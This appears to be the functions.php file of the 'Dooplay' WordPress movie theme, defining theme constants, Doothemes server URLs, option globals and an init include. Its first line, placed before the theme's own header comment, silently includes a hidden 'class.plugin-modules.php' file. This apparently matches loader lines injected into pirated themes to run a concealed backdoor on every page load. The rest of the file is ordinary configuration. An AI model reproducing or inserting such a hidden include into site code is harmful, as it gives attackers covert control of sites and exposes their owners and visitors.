<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
* ----------------------------------------------------
* @author: Doothemes
* @author URI: https://doothemes.com/
* @copyright: (c) 2017 Doothemes. All rights reserved
* ----------------------------------------------------
*
* @since 2.1.4
*
*/

# Theme options
define('DOO_THEME_GLOSSARY',     true );
define('DOO_THEME_DOWNLOAD_MOD', true );
define('DOO_THEME_PLAYER_MOD',   true );
define('DOO_THEME_DBMOVIES',     true );

# ( For DBbmovies ) Episodes slug structure
define ('DOO_ESEAS','');	// Season
define ('DOO_EEPISOD','');	// Episode
define ('DOO_ESEPART','x'); // separator

# Repository data
define('DOO_COM',			'Doothemes');
define('DOO_VERSION',		'2.1.3.96');
define('DOO_VERSION_DB',	'2.5');
define('DOO_ITEM_ID',		'154');
define('DOO_THEME',			'Dooplay');
define('DOO_THEME_SLUG',	'dooplay');
define('DOO_SERVER',		'https://doothemes.com');
define('DOO_SUPPORT_FORUMS','https://doothemes.com/forums/');
define('DOO_CHANGELOG',		'https://doothemes.com/items/dooplay/?view=changelog');
define('DOO_GICO',			'https://s2.googleusercontent.com/s2/favicons?domain=');

# Define Logic data
define('DOO_TIME',			'M. d, Y');
define('DOO_MAIN_RATING',	'_starstruck_avg');
define('DOO_MAIN_VOTOS',	'_starstruck_total');

# Define template directory
define('DOO_URI',	get_template_directory_uri());
define('DOO_DIR',	get_template_directory());

# globals variables
$doo_font        = get_option('dt_font_style','Roboto');
$doo_genre       = get_option('dt_genre_slug','genre');
$doo_gorc_public = get_option('dt_grpublic_key');
$doo_gorc_secret = get_option('dt_grprivate_key');


# Translations
load_theme_textdomain('mtms', DOO_DIR . '/lang/');

# Init
require get_parent_theme_file_path('/inc/doo_init.php');


/* Custom functions
========================================================
*/

	// Here your code
